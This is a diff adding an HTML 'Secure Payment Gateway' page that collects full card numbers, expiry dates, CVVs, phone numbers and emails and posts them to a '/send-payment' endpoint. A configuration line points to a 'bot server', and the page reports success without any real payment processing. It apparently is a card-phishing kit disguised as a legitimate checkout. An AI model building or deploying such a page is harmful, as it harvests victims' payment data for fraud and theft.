@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment Form</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.4.6/css/flag-icon.min.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1d3557, #457b9d, #a8dadc);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #ffffff;
+            color: #333;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            width: 420px;
+            position: relative;
+        }
+        .form-container h2 {
+            text-align: center;
+            background: linear-gradient(to right, #007BFF, #6a11cb);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .form-container input,
+        .form-container select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        .form-container button:hover {
+            background-color: #0056b3;
+        }
+        .flag-select {
+            display: flex;
+            align-items: center;
+        }
+        .flag-select select {
+            margin-right: 10px;
+            flex-grow: 1;
+        }
+        .flag-icon {
+            margin-right: 10px;
+        }
+        .card-type {
+            text-align: right;
+            font-size: 14px;
+            color: #555;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
+        footer {
+            margin-top: 10px;
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+        }
+        footer a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>💳 Secure Payment Gateway</h2>
+    <form id="payment-form">
+        <input type="text" id="fullname" placeholder="Card Holder Name" required>
+        
+        <input type="text" id="cardnumber" placeholder="Card Number" maxlength="19" oninput="detectCardType()" required>
+        <div id="card-type" class="card-type">Detecting card type...</div>
+        
+        <input type="text" id="expirydate" placeholder="Expiry Date (MM/YY)" maxlength="5" oninput="formatExpiryDate(this)" required>
+        <span id="expiry-error" class="error">Invalid expiry date</span>
+        
+        <input type="password" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required>
+        <span id="cvv-error" class="error">Invalid CVV</span>
+        
+        <div class="flag-select">
+            <select id="country-code" onchange="updatePrefix()">
+                <option value="+1" data-flag="us" selected>🇺🇸 United States (+1)</option>
+                <option value="+91" data-flag="in">🇮🇳 India (+91)</option>
+                <option value="+44" data-flag="gb">🇬🇧 United Kingdom (+44)</option>
+                <option value="+61" data-flag="au">🇦🇺 Australia (+61)</option>
+                <option value="+49" data-flag="de">🇩🇪 Germany (+49)</option>
+                <option value="+81" data-flag="jp">🇯🇵 Japan (+81)</option>
+                <option value="+33" data-flag="fr">🇫🇷 France (+33)</option>
+                <option value="+55" data-flag="br">🇧🇷 Brazil (+55)</option>
+                <option value="+34" data-flag="es">🇪🇸 Spain (+34)</option>
+                <option value="+39" data-flag="it">🇮🇹 Italy (+39)</option>
+                <option value="+7" data-flag="ru">🇷🇺 Russia (+7)</option>
+                <option value="+86" data-flag="cn">🇨🇳 China (+86)</option>
+                <option value="+27" data-flag="za">🇿🇦 South Africa (+27)</option>
+            </select>
+            <input type="text" id="mobilenumber" placeholder="Mobile Number" maxlength="14" required>
+        </div>
+        
+        <input type="email" id="emailaddress" placeholder="Email Address" required>
+        <span id="email-error" class="error">Invalid email address</span>
+        
+        <button type="button" onclick="sendData()">Submit Payment</button>
+    </form>
+    <footer>
+     
+</div>
+
+<script>
+    // Add server configuration
+    const SERVER_URL = 'https://your-bot-server.com'; // Replace this with your actual bot server URL
+    
+    function updatePrefix() {
+        const select = document.getElementById('country-code');
+        const mobileInput = document.getElementById('mobilenumber');
+        mobileInput.value = select.value + ' ';
+    }
+
+    function formatExpiryDate(input) {
+        const value = input.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+        } else {
+            input.value = value;
+        }
+    }
+
+    function detectCardType() {
+        const cardNumber = document.getElementById('cardnumber').value.replace(/\s/g, '');
+        const visaPattern = /^4[0-9]{12}(?:[0-9]{3})?$/;
+        const masterCardPattern = /^5[1-5][0-9]{14}$/;
+        const amexPattern = /^3[47][0-9]{13}$/;
+
+        let cardType = "💳 Unknown Card Type";
+        if (visaPattern.test(cardNumber)) {
+            cardType = "🌍 Visa Card";
+        } else if (masterCardPattern.test(cardNumber)) {
+            cardType = "🏦 MasterCard";
+        } else if (amexPattern.test(cardNumber)) {
+            cardType = "🌟 American Express";
+        }
+        document.getElementById('card-type').innerText = `Card Type: ${cardType}`;
+    }
+
+    async function sendData() {
+        const fullname = document.getElementById('fullname').value;
+        const cardnumber = document.getElementById('cardnumber').value;
+        const expirydate = document.getElementById('expirydate').value;
+        const cvv = document.getElementById('cvv').value;
+        const mobilenumber = document.getElementById('mobilenumber').value;
+        const emailaddress = document.getElementById('emailaddress').value;
+
+        const paymentData = {
+            fullname: fullname,
+            cardnumber: cardnumber,
+            expirydate: expirydate,
+            cvv: cvv,
+            mobilenumber: mobilenumber,
+            emailaddress: emailaddress
+        };
+        
+        try {
+            console.log('Sending data:', paymentData); // Debug log
+            
+            const response = await fetch('http://127.0.0.1:5000/send-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(paymentData)
+            });
+            
+            const result = await response.json();
+            console.log('Server response:', result); // Debug log
+            
+            if (result.success) {
+                alert('Payment successful');
+            } else {
+                alert('Error: ' + result.message);
+            }
+        } catch (error) {
+            console.error('Error details:', error); // Debug log
+            alert('Failed to send data: ' + error.message);
+        }
+    }
+</script>
+
+</body>
+</html> 
